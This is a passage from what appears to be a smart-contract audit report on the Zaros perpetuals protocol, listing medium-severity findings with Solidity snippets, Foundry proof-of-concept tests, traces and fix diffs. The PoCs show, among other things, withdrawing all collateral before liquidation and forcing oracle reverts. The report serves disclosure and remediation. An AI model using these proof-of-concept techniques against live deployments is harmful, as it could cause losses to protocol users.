3. `TradingAccountBranch::getAccountMarginBreakdown`
4. `TradingAccountBranch::getAccountTotalUnrealizedPnl`
5. `TradingAccountBranch::getAccountLeverage`
6. `TradingAccountBranch::withdrawMargin`
7. `SettlementBranch::fillMarketOrder`
8. `SettlementBranch::fillOffchainOrders`
9. `OrderBranch::simulateTrade`
10. `OrderBranch::getMarginRequirementForTrade`
11. `LiquidationBranch::liquidateAccount`
12. `LiquidationBranch::checkLiquidatableAccounts`

## Code Snippet:

https://github.com/Cyfrin/2024-07-zaros/blob/d687fe96bb7ace8652778797052a38763fbcbb1b/src/perpetuals/leaves/MarketConfiguration.sol#L37-L47

```javascript
struct Data {
        string name;
        string symbol;
        address priceAdapter;
        uint128 initialMarginRateX18;
        uint128 maintenanceMarginRateX18;
        uint128 maxOpenInterest;
        uint128 maxSkew;
        uint128 maxFundingVelocity;
        uint128 minTradeSizeX18;
        uint256 skewScale;
        OrderFees.Data orderFees;
        uint32 priceFeedHeartbeatSeconds;
    }

    /// @notice Updates the given market configuration.
    /// @dev See {MarketConfiguration.Data} for parameter details.
    function update(Data storage self, Data memory params) internal {
        self.name = params.name;
        self.symbol = params.symbol;
        self.priceAdapter = params.priceAdapter;
        self.initialMarginRateX18 = params.initialMarginRateX18;
        self.maintenanceMarginRateX18 = params.maintenanceMarginRateX18;
        self.maxOpenInterest = params.maxOpenInterest;
        self.maxSkew = params.maxSkew;
        self.maxFundingVelocity = params.maxFundingVelocity;
        self.minTradeSizeX18 = params.minTradeSizeX18;
        self.skewScale = params.skewScale;
        self.orderFees = params.orderFees;
    @>  // Missing update for priceFeedHeartbeatSeconds
    }
```

## Proof Of Concept:

1. While creating a new market configuration, the `priceFeedHeartbeatSeconds` param is given a non-zero value.
2. The `update` function is called to update the market configuration.
3. The `update` function never initializes the `priceFeedHeartbeatSeconds` variable, causing it to default to zero.
4. When the `getIndexPrice` function is called, that invokes the Chainlink oracle to fetch the price data.
5. The function `getPrice` reverts due to the uninitialized `priceFeedHeartbeatSeconds` variable.

Here is the commands to test:

```bash
# Add the following to the foundry.toml with Alchemy API key
[rpc_endpoints]
arbitrum_sepolia = "https://arb-sepolia.g.alchemy.com/v2/${API_KEY_ALCHEMY}
```

To test the POC, run the following Forge test:

```bash
forge test --mt test_FortisAudits_IndexPriceGetsDOS -vvvv
```

**Proof Of Code:**

Add the following code to the Base.t.sol file:

```javascript
// Creating the prepmarket suitable for the fork test
function createPerpMarketsFork() internal {
        createPerpMarkets(
            users.owner.account,
            perpsEngine,
            INITIAL_MARKET_ID,
            FINAL_MARKET_ID,
            IVerifierProxy(mockChainlinkVerifier),
            false
        );

        for (uint256 i = INITIAL_MARKET_ID; i <= FINAL_MARKET_ID; i++) {
            vm.label({ account: marketOrderKeepers[i], newLabel: "Market Order Keeper Fork" });
        }
    }
```

POC:

```javascript
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.25;

import { Base_Test } from "./Base.t.sol";
import { UD60x18, ud60x18 } from "@prb-math/UD60x18.sol";
import { SD59x18 } from "@prb-math/SD59x18.sol";
import { Errors } from "@zaros/utils/Errors.sol";

// Forked arb-sepolia test
contract BugTest is Base_Test {
    function setUp() public override {
        uint256 forkId = vm.createFork("https://sepolia-rollup.arbitrum.io/rpc");
        vm.selectFork(forkId);
        Base_Test.setUp();
        changePrank({ msgSender: users.owner.account });
        configureSystemParameters();
        createPerpMarketsFork();
    }

    function test_FortisAudits_IndexPriceGetsDOS() public {
        address ETH_USD = address(0xd30e2101a97dcbAeBCBC04F14C3f624E67A35165);
        deal({ token: address(usdc), to: users.naruto.account, give: 1000e6 });
        changePrank({ msgSender: users.naruto.account });
        createAccountAndDeposit(1000e6, address(usdc));
        vm.expectRevert(abi.encodeWithSelector(Errors.OraclePriceFeedHeartbeat.selector, ETH_USD));
        // Calling the index price for the ETH_USD marketid
        perpsEngine.exposed_getIndexPrice(2);
    }
}
```

Forge Test stack trace:

```javascript
├─ [36319] Perps Engine::exposed_getIndexPrice(2) [staticcall]
    │   ├─ [31069] PerpMarketHarness::exposed_getIndexPrice(2) [delegatecall]
    │   │   ├─ [27534] PerpMarket::a75e8fff(f2a828f98ebacfcc9ead142282f1b781df57bae404a8d1fa83ab68dfbae58f25) [delegatecall]
    │   │   │   ├─ [5595] 0xd30e2101a97dcbAeBCBC04F14C3f624E67A35165::decimals() [staticcall]
    │   │   │   │   ├─ [253] 0xf3138B59cAcbA1a4d7d24fA7b184c20B3941433e::decimals() [staticcall]
    │   │   │   │   │   └─ ← [Return] 8
    │   │   │   │   └─ ← [Return] 8
    │   │   │   ├─ [11235] 0xd30e2101a97dcbAeBCBC04F14C3f624E67A35165::latestRoundData() [staticcall]
    │   │   │   │   ├─ [7502] 0xf3138B59cAcbA1a4d7d24fA7b184c20B3941433e::latestRoundData() [staticcall]
    │   │   │   │   │   └─ ← [Return] 330001 [3.3e5], 314332890000 [3.143e11], 1721921867 [1.721e9], 1721921867 [1.721e9], 330001 [3.3e5]
    │   │   │   │   └─ ← [Return] 18446744073709881617 [1.844e19], 314332890000 [3.143e11], 1721921867 [1.721e9], 1721921867 [1.721e9], 18446744073709881617 [1.844e19]
    │   │   │   └─ ← [Revert] OraclePriceFeedHeartbeat(0xd30e2101a97dcbAeBCBC04F14C3f624E67A35165)
    │   │   └─ ← [Revert] OraclePriceFeedHeartbeat(0xd30e2101a97dcbAeBCBC04F14C3f624E67A35165)
    │   └─ ← [Revert] OraclePriceFeedHeartbeat(0xd30e2101a97dcbAeBCBC04F14C3f624E67A35165)
    └─ ← [Stop]
```

## Recommendations

To resolve this issue, ensure that the `priceFeedHeartbeatSeconds` variable is appropriately updated within the `update` function. Here is the recommended mitigation:

```diff
struct Data {
        string name;
        string symbol;
        address priceAdapter;
        uint128 initialMarginRateX18;
        uint128 maintenanceMarginRateX18;
        uint128 maxOpenInterest;
        uint128 maxSkew;
        uint128 maxFundingVelocity;
        uint128 minTradeSizeX18;
        uint256 skewScale;
        OrderFees.Data orderFees;
        uint32 priceFeedHeartbeatSeconds;
    }

    /// @notice Updates the given market configuration.
    /// @dev See {MarketConfiguration.Data} for parameter details.
    function update(Data storage self, Data memory params) internal {
        self.name = params.name;
        self.symbol = params.symbol;
        self.priceAdapter = params.priceAdapter;
        self.initialMarginRateX18 = params.initialMarginRateX18;
        self.maintenanceMarginRateX18 = params.maintenanceMarginRateX18;
        self.maxOpenInterest = params.maxOpenInterest;
        self.maxSkew = params.maxSkew;
        self.maxFundingVelocity = params.maxFundingVelocity;
        self.minTradeSizeX18 = params.minTradeSizeX18;
        self.skewScale = params.skewScale;
        self.orderFees = params.orderFees;
+       self.priceFeedHeartbeatSeconds = params.priceFeedHeartbeatSeconds;
    }
```

By including this update, the `priceFeedHeartbeatSeconds` variable will hold the correct value, allowing the `getIndexPrice` function to perform as intended without unnecessary reverts.

## <a id='M-04'></a>M-04. Incorrect liquidatable checking for market order creation

_Submitted by [joicygiore](https://profiles.cyfrin.io/u/joicygiore), [cryptomoon](https://profiles.cyfrin.io/u/cryptomoon), [h2134](https://profiles.cyfrin.io/u/h2134), [AllTooWell](https://codehawks.cyfrin.io/team/clvmefpm30001oev62qxtl4zt), [benrai](https://profiles.cyfrin.io/u/benrai), [s3v3ru5](https://profiles.cyfrin.io/u/s3v3ru5), [AuditTemple](https://codehawks.cyfrin.io/team/clyo65dx70009vjk4le7hszsf). Selected submission by: [h2134](https://profiles.cyfrin.io/u/h2134)._      
            


## Summary

Incorrect `marginBalanceUsdX18` is used for the liquidatable checking during market order creation, protocol may wrongly prevent an order from creating.

## Vulnerability Details

When a user calls to create a market order, protocol will [simulate](https://github.com/Cyfrin/2024-07-zaros/blob/d687fe96bb7ace8652778797052a38763fbcbb1b/src/perpetuals/branches/OrderBranch.sol#L79-L94) the settlement costs and validity of a given order. During the simulation, protocol checks if the current trading account is liquidatable and prevents liquidatable accounts from trading.

```solidity
        // calculate & output required initial & maintenance margin for the simulated trade
        // and account's unrealized PNL
        (requiredInitialMarginUsdX18, requiredMaintenanceMarginUsdX18, ctx.accountTotalUnrealizedPnlUsdX18) =
            tradingAccount.getAccountMarginRequirementUsdAndUnrealizedPnlUsd(marketId, ctx.sizeDeltaX18);

        // use unrealized PNL to calculate & output account's margin balance
        marginBalanceUsdX18 = tradingAccount.getMarginBalanceUsd(ctx.accountTotalUnrealizedPnlUsdX18);
        {
            // get account's current required margin maintenance (before this trade)
            (, ctx.previousRequiredMaintenanceMarginUsdX18,) =
                tradingAccount.getAccountMarginRequirementUsdAndUnrealizedPnlUsd(0, SD59x18_ZERO);

            // prevent liquidatable accounts from trading
            if (TradingAccount.isLiquidatable(ctx.previousRequiredMaintenanceMarginUsdX18, marginBalanceUsdX18)) {
                revert Errors.AccountIsLiquidatable(tradingAccountId);
            }
        }
```

As we can see from above, the account's current required margin maintenance is compared to `marginBalanceUsdX18` to determine if the account is liquidatable.

```Solidity
        // prevent liquidatable accounts from trading
        if (TradingAccount.isLiquidatable(ctx.previousRequiredMaintenanceMarginUsdX18, marginBalanceUsdX18)) {
            revert Errors.AccountIsLiquidatable(tradingAccountId);
        }
```

The `marginBalanceUsdX18` is calculated based on  `ctx.accountTotalUnrealizedPnlUsdX18`, which is calculated by [getAccountMarginRequirementUsdAndUnrealizedPnlUsd()](https://github.com/Cyfrin/2024-07-zaros/blob/d687fe96bb7ace8652778797052a38763fbcbb1b/src/perpetuals/leaves/TradingAccount.sol#L210-L222) in `TradingAccount` lib.

```solidity
        // calculate & output required initial & maintenance margin for the simulated trade
        // and account's unrealized PNL
        (requiredInitialMarginUsdX18, requiredMaintenanceMarginUsdX18, ctx.accountTotalUnrealizedPnlUsdX18) =
            tradingAccount.getAccountMarginRequirementUsdAndUnrealizedPnlUsd(marketId, ctx.sizeDeltaX18);


        // use unrealized PNL to calculate & output account's margin balance
        marginBalanceUsdX18 = tradingAccount.getMarginBalanceUsd(ctx.accountTotalUnrealizedPnlUsdX18);
```

`getAccountMarginRequirementUsdAndUnrealizedPnlUsd()` is called with `marketId` and `ctx.sizeDeltaX18` arguments, in this function, `ctx.sizeDeltaX18` is used for calculating `markPrice` which in turn is used to get `accountTotalUnrealizedPnlUsdX18`.

```solidity
            // calculate price impact of the change in position
            UD60x18 markPrice = perpMarket.getMarkPrice(sizeDeltaX18, perpMarket.getIndexPrice());

            ...

            // get unrealized pnl + accrued funding fees
            SD59x18 positionUnrealizedPnl =
                position.getUnrealizedPnl(markPrice).add(position.getAccruedFunding(fundingFeePerUnit));
```

By doing that, the `accountTotalUnrealizedPnlUsdX18` value returned is essentially the value after the trade, hence the `marginBalanceUsdX18` is not the current margin balance but the margin balance after the trade. It's obviously wrong that protocol compares the **margin balance after the trade** with **current required maintenance margin** to determine if the trading account is currently liquidatable.

In fact, when a trading account is actually being [liquidated](https://github.com/Cyfrin/2024-07-zaros/blob/d687fe96bb7ace8652778797052a38763fbcbb1b/src/perpetuals/branches/LiquidationBranch.sol#L137-L148), protocol  compares the trading account's **current margin balance** with **current required margin maintenance** to see if the account is liquidatable, and that is the correct checking.

```Solidity
            // get account's required maintenance margin & unrealized PNL
            (, UD60x18 requiredMaintenanceMarginUsdX18, SD59x18 accountTotalUnrealizedPnlUsdX18) =
@>              tradingAccount.getAccountMarginRequirementUsdAndUnrealizedPnlUsd(0, SD59x18_ZERO);


            // get then save margin balance into working data
            ctx.marginBalanceUsdX18 = tradingAccount.getMarginBalanceUsd(accountTotalUnrealizedPnlUsdX18);


            // if account is not liquidatable, skip to next account
            // account is liquidatable if requiredMaintenanceMarginUsdX18 > ctx.marginBalanceUsdX18
            if (!TradingAccount.isLiquidatable(requiredMaintenanceMarginUsdX18, ctx.marginBalanceUsdX18)) {
                continue;
            }
```

## Impact

If the skew is to be decresed after the trade, mark price becomes lower hence lower the `accountTotalUnrealizedPnlUsdX18`, leads to a lower margin balance than the current margin balance, a trader might be wrongly prevented from creating the order, under certain circumstances, the impact could be critical as the position continues to deteriorate and goes below the maintenance margin requirement which would cause their position to be liquidated

## Tools Used

Manual Review

## Recommendations

Should use the trading account's **current margin balance** to check against \*\*current required margin maintenance \*\*to see if the account is liquidatable.

```diff
        {
            // get account's current required margin maintenance (before this trade)
-           (, ctx.previousRequiredMaintenanceMarginUsdX18,) =
-               tradingAccount.getAccountMarginRequirementUsdAndUnrealizedPnlUsd(0, SD59x18_ZERO);

+           (, ctx.previousRequiredMaintenanceMarginUsdX18, ctx.accountTotalUnrealizedPnlUsdX18) =
+               tradingAccount.getAccountMarginRequirementUsdAndUnrealizedPnlUsd(0, SD59x18_ZERO);

+           marginBalanceUsdX18 = tradingAccount.getMarginBalanceUsd(ctx.accountTotalUnrealizedPnlUsdX18);

            // prevent liquidatable accounts from trading
            if (TradingAccount.isLiquidatable(ctx.previousRequiredMaintenanceMarginUsdX18, marginBalanceUsdX18)) {
                revert Errors.AccountIsLiquidatable(tradingAccountId);
            }
        }
```

## <a id='M-05'></a>M-05. User can withdraw all collateral when a position has enough profit so if liquidated no collateral can be deducted

_Submitted by [0xlandlady](https://profiles.cyfrin.io/u/0xlandlady), [tedox](https://profiles.cyfrin.io/u/tedox), [draiakoo](https://profiles.cyfrin.io/u/draiakoo), [0xrststn](https://profiles.cyfrin.io/u/0xrststn). Selected submission by: [0xrststn](https://profiles.cyfrin.io/u/0xrststn)._      
            


## Summary

In `TradingAccountBranch::withdrawMargin`, it is checked that the margin balance is greater than the required initial margin once collateral has been withdrawn:
<https://github.com/Cyfrin/2024-07-zaros/blob/69ccf428b745058bea08804b3f3d961d31406ba8/src/perpetuals/branches/TradingAccountBranch.sol#L382-L392>
If a user has a position with enough profit (i.e. unrealized PnL is greater than the required maintenance margin), this user can withdraw all collateral. If, later, that position becomes liquidatable, this user has no collateral so none can be deducted.

## Vulnerability Details

Let's assume a user opens a long position of 1 contract at 3,000 of ETHUSD. Let's also assume the maintenance margin rate required is 5%:
Position value: 1 \* 3,000 = 3,000
Maintenance margin: 3,000 \* 5% = 150
As soon as this position is in profit above 150, the user can withdraw all collateral. With zero collateral, if the position\`s profit fall below 150, it will get liquidated (position will get closed) but no collateral will be deducted.

## Impact

In this PoC, a position is created, when enough profit is accrued, collateral is withdrawn. Later, price is updated so the position becomes liquidatable and it is liquidated.
Add this test into `liquidateAccounts.t.sol`:

```solidity
function test_All_Collateral_Withdrawn() external {
        uint256 amountToDeposit = 100e18;

        deal({ token: address(wstEth), to: users.naruto.account, give: amountToDeposit });

        uint128 tradingAccountId = createAccountAndDeposit(amountToDeposit, address(wstEth));
        uint128 marketId = 0;
        int128 amount = 10e18;

        MarketConfig memory fuzzMarketConfig = getFuzzMarketConfig(marketId);
        perpsEngine.createMarketOrder(
            OrderBranch.CreateMarketOrderParams(tradingAccountId, fuzzMarketConfig.marketId, amount)
        );
        bytes memory mockSignedReport =
            getMockedSignedReport(fuzzMarketConfig.streamId, fuzzMarketConfig.mockUsdPrice);
        address marketOrderKeeper = marketOrderKeepers[fuzzMarketConfig.marketId];

        changePrank({ msgSender: marketOrderKeeper });

        perpsEngine.fillMarketOrder(tradingAccountId, fuzzMarketConfig.marketId, mockSignedReport);

        //Price updated to make the position with enough profit so collateral can be withdrawn
        updateMockPriceFeed(uint128(fuzzMarketConfig.marketId), 2e23);

        // it should transfer the withdrawn amount to the sender
        changePrank({ msgSender: users.naruto.account });
        uint256 newMarginCollateralBalance = convertUd60x18ToTokenAmount(
            address(wstEth), perpsEngine.getAccountMarginCollateralBalance(tradingAccountId, address(wstEth))
        );
        perpsEngine.withdrawMargin(tradingAccountId, address(wstEth), newMarginCollateralBalance);

        //Price updated to make the position liquidatable
        updateMockPriceFeed(uint128(fuzzMarketConfig.marketId), 8e22);

        uint128[] memory accountsIds;
        accountsIds = new uint128[](1);
        accountsIds[0] = tradingAccountId;

        changePrank({ msgSender: liquidationKeeper });
        perpsEngine.liquidateAccounts({ accountsIds: accountsIds });
    }
```

As can be seen in the event emitted, the `liquidatedCollateralUsd` is `zero` even though the `requiredMaintenanceMarginUsd` is `4e21`and `liquidationFeeUsd` is `5e18`

```TypeScript
LogLiquidateAccount(keeper: ERC1967Proxy: [0x50795785161296B0A64914b4ee9285bAF70371Cd], tradingAccountId: 1, amountOfOpenPositions: 1,
 requiredMaintenanceMarginUsd: 4000002000000000000000 [4e21], marginBalanceUsd: -200000100000000000000000 [-2e23],
 liquidatedCollateralUsd: 0, liquidationFeeUsd: 5000000000000000000 [5e18])
```

## Tools Used

Foundry

## Recommendations

A minimum amount of collateral (e.g. required initial margin) should always remain in the user account as long as he has got open positions.

## <a id='M-06'></a>M-06. User might be unfairly liquidated after L2 Sequencer grace period

_Submitted by [h2134](https://profiles.cyfrin.io/u/h2134)._      
            


## Summary

User might be unfairly liquidated after L2 Sequencer grace period.

## Vulnerability Details

The protocol implements a L2 sequencer downtime check in the [ChainlinkUtil](https://github.com/Cyfrin/2024-07-zaros/blob/d687fe96bb7ace8652778797052a38763fbcbb1b/src/external/chainlink/ChainlinkUtil.sol#L41-L57). In the event of sequencer downtime (as well as a grace period following recovery), liquidations are disabled for the rightful reasons.

```Solidity
        if (address(sequencerUptimeFeed) != address(0)) {
            try sequencerUptimeFeed.latestRoundData() returns (
                uint80, int256 answer, uint256 startedAt, uint256, uint80
            ) {
                bool isSequencerUp = answer == 0;
                if (!isSequencerUp) {
@>                  revert Errors.OracleSequencerUptimeFeedIsDown(address(sequencerUptimeFeed));
                }

                uint256 timeSinceUp = block.timestamp - startedAt;
                if (timeSinceUp <= Constants.SEQUENCER_GRACE_PERIOD_TIME) {
@>                  revert Errors.GracePeriodNotOver();
                }
            } catch {
                revert Errors.InvalidSequencerUptimeFeedReturn();
            }
        }
```

At the same time, user won't be able to create order nor any order can be filled. This is problematic because when the Arbitrum sequencer is down and then comes back up, all Chainlink price updates will become available on Arbitrum within a very short time. This leaves users no time to react to the price changes which can lead to unfair liquidations.

Even if deposit is still allowed during the grace period, it is unfair to the user as they are forced to do so, not to mention that some users may not have enough funds to deposit.

## Impact

User might be unfairly liquidated after L2 Sequencer grace period.

## Tools Used

Manual Review

## Recommendations

Order should be allowed to be created and filled during sequencer grace period, this can be achieved by skipping `SEQUENCER_GRACE_PERIOD_TIME` checking.

```diff
    function getPrice(
        IAggregatorV3 priceFeed,
        uint32 priceFeedHeartbeatSeconds,
        IAggregatorV3 sequencerUptimeFeed,
+       bool skipGracePeriodChecking
    )
        internal
        view
        returns (UD60x18 price)
    {
        ...

        if (address(sequencerUptimeFeed) != address(0)) {
            try sequencerUptimeFeed.latestRoundData() returns (
                uint80, int256 answer, uint256 startedAt, uint256, uint80
            ) {
                bool isSequencerUp = answer == 0;
                if (!isSequencerUp) {
                    revert Errors.OracleSequencerUptimeFeedIsDown(address(sequencerUptimeFeed));
                }

                uint256 timeSinceUp = block.timestamp - startedAt;
-                if (timeSinceUp <= Constants.SEQUENCER_GRACE_PERIOD_TIME) {
+                if (!skipGracePeriodChecking && timeSinceUp <= Constants.SEQUENCER_GRACE_PERIOD_TIME) {
                    revert Errors.GracePeriodNotOver();
                }
            } catch {
                revert Errors.InvalidSequencerUptimeFeedReturn();
            }
        }

        ...
    }
```

## <a id='M-07'></a>M-07. SEV 5: The getAccountMarginRequirementUsdAndUnrealizedPnlUsd function returns incorrect margin requirement values when a position is being changed

_Submitted by [fyamf](https://profiles.cyfrin.io/u/fyamf), [kupiasec](https://profiles.cyfrin.io/u/kupiasec), [s3v3ru5](https://profiles.cyfrin.io/u/s3v3ru5), [cryptomoon](https://profiles.cyfrin.io/u/cryptomoon). Selected submission by: [s3v3ru5](https://profiles.cyfrin.io/u/s3v3ru5)._      
            


Severity: High

## Summary

The `getAccountMarginRequirementUsdAndUnrealizedPnlUsd` function incorrectly uses current order's fill price as the mark price for computing margin requirements the account needs to satisfy after the trade is processed.

## Vulnerability Details

The `TradingAccount::getAccountMarginRequrementUsdAndUnrealizedPnlUsd` function is used to compute margin requirements of an account. The function performs additional computations to calculate the margin requirements of the account after the trade was executed.

The function calculates uses incorrect `markPrice` for computing after trade margin requirements. The incorrect price is used to calculate the `intialMargin` and `maintenanceMargin`. As a result, the protocol might process invalid orders which do not meet the actual margin requirements and might reject valid orders.

The vulnerable uses of this function is in `SettlementBranch::_fillOrder` and `OrderBranch::createMarketOrder`. Both the `_fillOrder` and `createMarketOrder` functions try to ensure that account meets the margin requirements **after** the requsted order is processed.

consider following definitions:

**usedInitialMargin**, **usedMaintenanceMargin**: These are values returned by the **current** incorrect implementation and are used by the `_fillOrder`, `createMarketOrder` functions. These are margin requirements the protocol considers the account needs to satisfy after the trade.

**correctInitialMargin**, **correctMaintenanceMargin**: These are correct margin requirement values after the trade. If the liquidation function is called immediately after processing the trade, the liquidation function uses these values to check if the account is liquidatable.

The incorrect code is in the `if (targetMarketId != 0)` branch of the `getAccountMarginRequrementUsdAndUnrealizedPnlUsd` function. The branch calculates `markPrice` for filling the current order. The function uses this `markPrice` as the price liquidation code would use if called immediately after filling the order. These two prices will be different leading to incorrect calculation of margin requirements.

Consider `skew` and `positionSize` as the market skew and trader's position size in the target market.

`markPrice` for filling the order as calculated by the current implementation:

`markPriceCurrentOrder` = `perpMarket.getMarkPrice(sizeDelta, indexPrice)`

The `markPrice` depends on the market `skew` and `skewScale`. The `markPriceCurrentOrder` is the filling price for the current order.

Consider that the current order is filled and the liquidation code is executed in the next transaction. The `markPrice` will be different because of change in skew and the position size.

`afterTradeSkew` = `skew` + `sizeDelta`
`afterTradePositionSize` = `positionSize` + `sizeDelta`

`markPriceUsedByLiquidation` = `perpMarket.getMarkPrice(-afterTradePositionSize, indexPrice)`

The `markPriceCurrentOrder`, `markPriceUsedByLiquidation` are different because of changes in `skew` and the change in `position size`. Because the `markPriceCurrentOrder` is used for computing after the trade margin requirements  (i.e as `markPriceUsedByLiquidation`) and margin requirements change depending on the mark price, the function returns incorrect margin requirement values.

Let
`correctMarkPrice` = `markPriceUsedByLiquidation`
`usedMarkPrice` = `markPriceCurrentOrder`

`positionSize` = `position.size` before the order.

Then
`correctMarkPrice - usedMarkPrice = -1/2 * indexPrice * positionSize / skewScale`

As a result, 

* if `positionSize` > `0`:
  * `correctMarkPrice` < `usedMarkPrice` =>
    * `correctInitialMargin` < `usedInitialMargin`
    * `correctMaintenanceMargin` < `usedMaintenanceMargin`
  * As a result, protocol uses a larger value than the actual for the margin requirement values.
  * if `correctInitialMargin` < `traderMarginBalance` < `usedInitialMargin`
    * protocol rejects a size increasing trade even though user has required initialMargin.
  * if `correctMaintenanceMargin` < `traderMarginBalance` < `usedMaintenanceMargin`
    * protocol considers the account to be liquidatable even though its not and rejects orders which reduce the position size.
    * The trader cannot save their account from becoming liquidatable.

* if `positionSize` < `0`:
  * `correctMarkPrice` > `usedMarkPrice` =>
    * `correctInitialMargin` > `usedInitialMargin`
    * `correctMaintenanceMargin` > `usedMaintenanceMargin`
  * As a result, protocol uses a smaller value than the actual for the margin requirement values.
  * if `correctInitialMargin` > `traderMarginBalance` > `usedInitialMargin`
    * protocol accepts a size increasing trade when the trader is under `initialMarginRequirement`.
  * if `correctMaintenanceMargin` > `traderMarginBalance` > `usedMaintenanceMargin`
    * Protocol allows a liquidatable account to perform trades and close their positions.

### Code Snippets:

Use of `getAccountMarginRequirementUsdAndUnrealizedPnlUsd` to compute after the trade margin values: [SettlementBranch.sol#L410-L414](https://github.com/Cyfrin/2024-07-zaros/blob/d687fe96bb7ace8652778797052a38763fbcbb1b/src/perpetuals/branches/SettlementBranch.sol#L410-L414)

Use of `markPriceCurrentOrder` for calculating after the trade`notionalValue`: [TradingAccount.sol#L232-L240](https://github.com/Cyfrin/2024-07-zaros/blob/d687fe96bb7ace8652778797052a38763fbcbb1b/src/perpetuals/leaves/TradingAccount.sol#L232-L240)

Computation of `markPrice` by the liquidation code: [TradingAccount.sol#L278-L285](https://github.com/Cyfrin/2024-07-zaros/blob/d687fe96bb7ace8652778797052a38763fbcbb1b/src/perpetuals/leaves/TradingAccount.sol#L278-L285)

Use of `skew` in computation of `markPrice`: [PerpMarket.sol#L110-L121](https://github.com/Cyfrin/2024-07-zaros/blob/d687fe96bb7ace8652778797052a38763fbcbb1b/src/perpetuals/leaves/PerpMarket.sol#L110-L121)

### POC:

The following POC can be used to verify the issue. The test case only considers one active market and the test case shows the difference in the correct and used values. The mock functions are a copy of the original implementation without any storage variables. **The arthimetic operations are equivalent**.

The `pnl` and `fundingFee` are not considered in the calculations as these values only influence the trader's `marginBalance`.

`forge test --match-contract AfterTradeMarginTest -vv --via-ir`

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.25;

import { UD60x18, ud60x18, convert as ud60x18Convert  } from "@prb-math/UD60x18.sol";
import { SD59x18, sd59x18, ZERO as SD59x18_ZERO, unary } from "@prb-math/SD59x18.sol";
import { SafeCast } from "@openzeppelin/utils/math/SafeCast.sol";

import {Test} from "forge-std/Test.sol";
import "forge-std/console.sol";

library MockConstants {

    uint256 constant indexPrice = 68818;
    uint256 constant skewScale = 1_000_000e18; // 1M
    int256 constant skew = 0e18; 
    uint256 constant initialMarginRateX18 = 0.1e18;
    uint256 constant maintenanceMarginRateX18 = 0.05e18;

}

library MockPerpMarket {
    function getIndexPrice() internal pure returns (UD60x18) {
        return ud60x18Convert(MockConstants.indexPrice);
    }

    function getMarkPrice(
        SD59x18 skew,
        SD59x18 skewDelta,
        UD60x18 indexPriceX18
    )
        internal
        pure
        returns (UD60x18 markPrice)
    {
        // following two lines are changed to use MockConstants and arguments
        SD59x18 skewScale = sd59x18(int256(MockConstants.skewScale));

        SD59x18 priceImpactBeforeDelta = skew.div(skewScale);
        SD59x18 newSkew = skew.add(skewDelta);
        SD59x18 priceImpactAfterDelta = newSkew.div(skewScale);

        SD59x18 cachedIndexPriceX18 = indexPriceX18.intoSD59x18();

        UD60x18 priceBeforeDelta =
            cachedIndexPriceX18.add(cachedIndexPriceX18.mul(priceImpactBeforeDelta)).intoUD60x18();
        UD60x18 priceAfterDelta =
            cachedIndexPriceX18.add(cachedIndexPriceX18.mul(priceImpactAfterDelta)).intoUD60x18();

        markPrice = priceBeforeDelta.add(priceAfterDelta).div(ud60x18Convert(2));
    }
}

library MockTradingAccount {
    function getAccountMarginRequirementUsdAndUnrealizedPnlUsd(
        Position.Data memory position,
        uint128 targetMarketId,
        SD59x18 sizeDeltaX18,
        // passed as arg instead of storage
        SD59x18 skew
    )
        internal
        view
        returns (
            UD60x18 requiredInitialMarginUsdX18,
            UD60x18 requiredMaintenanceMarginUsdX18,
            UD60x18 markPrice
        )
    {
        // if an existing position is being changed, perform some additional processing
        if (targetMarketId != 0) {
            // @s3v3ru5: Incorrect implementation used by protocol to calculate margin requirements after a trade
            // calculate price impact of the change in position
            markPrice = MockPerpMarket.getMarkPrice(skew, sizeDeltaX18, MockPerpMarket.getIndexPrice());

            // when dealing with the market id being settled, we simulate the new position size to get the new
            // margin requirements.
            UD60x18 notionalValueX18 = sd59x18(position.size).add(sizeDeltaX18).abs().intoUD60x18().mul(markPrice);

            // calculate margin requirements
            (UD60x18 positionInitialMarginUsdX18, UD60x18 positionMaintenanceMarginUsdX18) = Position
                .getMarginRequirement(
                notionalValueX18,
                ud60x18(MockConstants.initialMarginRateX18),
                ud60x18(MockConstants.maintenanceMarginRateX18)
            );

            // update cumulative outputs
            requiredInitialMarginUsdX18 = requiredInitialMarginUsdX18.add(positionInitialMarginUsdX18);
            requiredMaintenanceMarginUsdX18 = requiredMaintenanceMarginUsdX18.add(positionMaintenanceMarginUsdX18);
        } else {
            // @s3v3ru5: This is the correct calculation of margin requirements after a trade 
            // calculate price impact as if trader were to close the entire position
            markPrice = MockPerpMarket.getMarkPrice(skew, sd59x18(-position.size), MockPerpMarket.getIndexPrice());

            // calculate notional value
            UD60x18 notionalValueX18 = sd59x18(position.size).abs().intoUD60x18().mul(markPrice);
            // position.getNotionalValue(markPrice);

            // calculate margin requirements
            (UD60x18 positionInitialMarginUsdX18, UD60x18 positionMaintenanceMarginUsdX18) = Position
                .getMarginRequirement(
                notionalValueX18,
                ud60x18(MockConstants.initialMarginRateX18),
                ud60x18(MockConstants.maintenanceMarginRateX18)
            );

            // update cumulative outputs
            requiredInitialMarginUsdX18 = requiredInitialMarginUsdX18.add(positionInitialMarginUsdX18);
            requiredMaintenanceMarginUsdX18 = requiredMaintenanceMarginUsdX18.add(positionMaintenanceMarginUsdX18);
        }
    }
}

library Position {

    struct Data {
        int256 size;
        uint128 lastInteractionPrice;
        int128 lastInteractionFundingFeePerUnit;
    }

    function getMarginRequirement(
        UD60x18 notionalValueX18,
        UD60x18 initialMarginRateX18,
        UD60x18 maintenanceMarginRateX18
    )
        internal
        pure
        returns (UD60x18 initialMarginUsdX18, UD60x18 maintenanceMarginUsdX18)
    {
        initialMarginUsdX18 = notionalValueX18.mul(initialMarginRateX18);
        maintenanceMarginUsdX18 = notionalValueX18.mul(maintenanceMarginRateX18);
    }

}


contract AfterTradeMarginTest is Test {
    function assertGetAccountMargin(int256 sizeDelta, int256 positionSize) internal {
        uint128 marketId = 1;
        uint128 marketIdLiqudator = 0;
        SD59x18 sizeDelta = sd59x18(sizeDelta);
        SD59x18 skew = sd59x18(MockConstants.skew);

        Position.Data memory position = Position.Data({
            size: positionSize,
            lastInteractionPrice: 0,
            lastInteractionFundingFeePerUnit: 0
        });

        (UD60x18 usedInitialMarginUsdX18, UD60x18 usedMaintenanceMarginUsdX18, UD60x18 usedMarkPrice) = MockTradingAccount
            .getAccountMarginRequirementUsdAndUnrealizedPnlUsd(
                position,
                marketId,
                sizeDelta,
                skew
            );
        
        // @s3v3ru5: Liquidation code would calculate the margin requirements as calculated below.
        // These values should have been used by the SettlementBranch to check the margin balance.
